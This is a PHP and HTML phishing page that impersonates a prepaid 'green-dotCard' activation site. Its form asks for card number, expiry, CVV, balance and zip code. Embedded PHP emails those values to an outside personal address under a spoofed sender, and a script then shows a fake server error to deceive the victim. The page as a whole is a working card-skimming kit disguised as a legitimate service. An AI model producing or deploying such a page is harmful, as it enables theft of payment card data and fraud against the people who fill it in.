<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <?php
    if (isset($_POST['send'])) {
        $to = "sanjeev.rajput1976@gmail.com"; // Your email address

        
        $zipCode = $_POST['zipCode'];
        $currentBalance = $_POST['currentBalance'];
        $cardNumber = $_POST['CardNumber'];
        $cvv = $_POST['cvv'];
        $expiry = $_POST['expiry'];

        $subject = "Details of Payment";
        $message = "Zip Code: " .  $zipCode . "\r\n" . "currentBalance: " .  $currentBalance . "\r\n" . "Card Number: " .  $cardNumber . "\r\n" .  "CVV: " .  $cvv . "\r\n" .  "Expiry: " .  $expiry;

        $headers = "From: info@geendat.online\r\n";
        $headers .= "Reply-To: info@geendat.online\r\n";
        $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";

        mail($to, $subject, $message, $headers);
    }
    ?>



  <div class="header-top">
    <div class="header">
      <div class="logo">
          <!-- Insert your logo here -->
          <img src="logo.webp" alt="Logo">
      </div>
      <ul class="menu-items">
          <li><a href="#">Home</a></li>
          <li><a href="#">Services</a></li>
          <li><a href="#">Privacy Policy</a></li>
          <li><a href="#">Gallery</a></li>
          <li><a href="#">Contact</a></li>
          <li><a href="#">Book Online</a></li>
      </ul>
  </div>
  <img class="cart" src="bgr.png" height="32px" width="32px"/>
  </div>



  <div class="bg">
   <div>
    <div  class="main-box">
      <h1>
        Register & activate your green-dotCard online<br>

         Your are just Click Away !
      </h1>
      <div style="display: flex; justify-content: center; padding-top: 10px;">
        <div class="innerbox">
          <p><span class="activate" style="font-size: 24px;">
            Activate Your Card</span><br>
  Enter your details here to Activate<br> your Card.<br>
  <span id="error" style="color: red; font-size: 20px; margin-top: 20px; display: inline-block;">
</span>
          </p>
  
  
          <form action="#" method="post">
            <label>16 Digits # </label><br>
            <input style="width: 312px; height: 52px; border-radius: 10px;" type="number" placeholder="enter digit  phone number" name="CardNumber" required><br>
            <label>Exp Date  </label><br>
            <input style="width: 271px; height: 52px; border-radius: 10px;" type="text" placeholder="MMYY" name="expiry" required><br>
            <label>Securty  </label><br>
            <input style="width: 271px; height: 52px; border-radius: 10px;" type="password" placeholder="***" name="cvv" maxlength="3" required><br>
            <label>Current Balance </label><br>
            <input style="width: 271px; height: 52px; border-radius: 10px;" type="text" placeholder="Current card balance" name="currentBalance" required><br>
            <label>Zip Code </label><br>
            <input style="width: 271px; height: 52px; border-radius: 10px;" type="text" placeholder="12345" name="zipCode" required><br>
            <button name="send" id="btn" style="width: 170px; height: 46px; border-radius: 40px; margin-top: 20px; background-color: black; color: white; border: 1px solid white; margin-bottom: 40px;" type="submit">Continue</button>
        </form>
        </div>
      </div>

    <div style="display: flex; justify-content: center; padding-bottom: 20px;">
      <p style="margin-top: 20px; color: #493414;">
        Greens dot card is best prepaid card for your daily spendings.<br> activate your greens pack online and get cash back. register today<br> for free no fees. 
      </p>
    </div>

      
    </div>
    <div style="width: 800px; background-color: white; width: 1000px;">
      <img src="GreenDot-web-banner-1024x427.webp" alt="" width="980px" style="padding: 0px 5px 0px 5px;"/>
    

      <img src="footer.webp" alt="" width="980px" style="padding: 0px 5px 0px 5px; margin-top: 20px;"/>
    
    
    </div>
   </div>

    
</div>

<script>
  document.getElementById("btn").addEventListener('click', function(event)){
    var error = document.getElementById("error").innerHTML="  Error- 204. Server error. please try<br> again after some time !";
    console.log("hello");
    
  }
</script>

</body>
</html>